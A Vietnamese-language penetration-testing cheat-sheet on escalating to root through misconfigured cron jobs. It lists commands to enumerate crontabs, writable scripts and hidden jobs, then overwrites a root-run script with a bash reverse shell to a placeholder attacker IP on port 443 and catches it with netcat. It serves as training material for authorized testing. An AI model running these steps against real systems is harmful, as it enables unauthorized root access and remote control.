# Cron Jobs

## Điểm chính khai thác

* Khai thác các công việc cron chạy với quyền root để nâng quyền từ người dùng thường, tận dụng tập lệnh hoặc thư mục có thể ghi, thông tin xác thực cứng, hoặc cấu hình sai
* Công việc cron được lên lịch bằng định dạng phút, giờ, ngày, tháng, ngày trong tuần, với tần suất ảnh hưởng đến thời gian khai thác: mỗi phút (60 giây) lý tưởng, trong khi mỗi ngày (86,400 giây) cần chờ lâu hơn
* Các thư mục như /etc/cron.d/, /etc/cron.hourly/, /etc/cron.daily/, /var/spool/cron/crontabs/ là mục tiêu tiềm năng để tìm tệp cấu hình sai hoặc có thể ghi
* Công cụ như pspy giúp phát hiện công việc cron ẩn và xác định khoảng thời gian thực thi thời gian thực, đặc biệt trong container hoặc hệ thống phức tạp

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Hiển thị các công việc cron hệ thống trong /etc/crontab để tìm tập lệnh chạy bởi root hoặc cấu hình sai:

```
cat /etc/crontab
```

Xác định công việc cron của người dùng hiện tại để tìm tập lệnh chạy bởi root với đường dẫn có thể chỉnh sửa:

```
crontab -l
```

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra các thư mục cron đặc biệt để tìm tập lệnh có thể ghi hoặc cấu hình sai:

```
ls -l /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

Tìm tập lệnh có thể ghi được cron tham chiếu để xác định mục tiêu khai thác:

```
find / -writable -type f 2>/dev/null
```

#### Phân tích ngữ cảnh thực thi

Xác nhận các công việc cron đang hoạt động và thời gian thực thi, đồng thời kiểm tra lệnh được thực thi:

```
grep "CRON" /var/log/syslog
```

Phát hiện công việc cron không được liệt kê và xác định tập lệnh chạy bởi root:

```
./pspy
```

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Ghi đè tập lệnh có thể ghi bằng shell ngược để chuẩn bị khai thác:

```
echo '/bin/bash -i >& /dev/tcp/attacker_ip/443 0>&1' > <file>
```

{% hint style="info" %}
Đảm bảo tệp có quyền ghi (`-rw-rw-rw-`, kiểm tra bằng `ls -l`).&#x20;
{% endhint %}

#### Áp dụng khai thác

Trao quyền thực thi cho reverse shell

```
chmod +x <file>
```

Thay thế reverse shell với file thực thi đang chạy cron job

```
mv <file> <path_file>
```

#### Kích hoạt khai thác

Chờ cron thực thi tập lệnh để kích hoạt payload:

```
nc -lvnp 443
```